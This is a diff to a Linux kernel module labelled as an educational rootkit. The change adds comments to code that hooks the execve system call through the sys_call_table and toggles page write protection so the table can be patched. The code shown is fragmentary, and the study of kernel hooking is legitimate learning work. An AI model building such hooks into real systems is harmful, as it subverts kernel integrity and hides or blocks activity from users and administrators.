@@ -8,6 +8,7 @@ MODULE_DESCRIPTION("A rootkit for educational purposes");
 
 unsigned long** sys_call_table;
 
+//This is my stupid execve example. If a banned process is run, it says file not found.
 asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]){
 
 	char *kern_buff = NULL;
@@ -33,6 +34,7 @@ asmlinkage long hacked_execve(const char __user *filename, char const __user *ar
 	return ret;
 }
 
+//We need this to set access permissions on the address we pass to it
 void set_addr_rw(unsigned long addr)
 {
 	    unsigned int level;
@@ -42,6 +44,7 @@ void set_addr_rw(unsigned long addr)
 			            pte->pte |= _PAGE_RW;
 }
 
+//We need this to set our sys_call_table back to read only as the kernel requires
 void set_addr_ro(unsigned long addr)
 {
 	    unsigned int level;
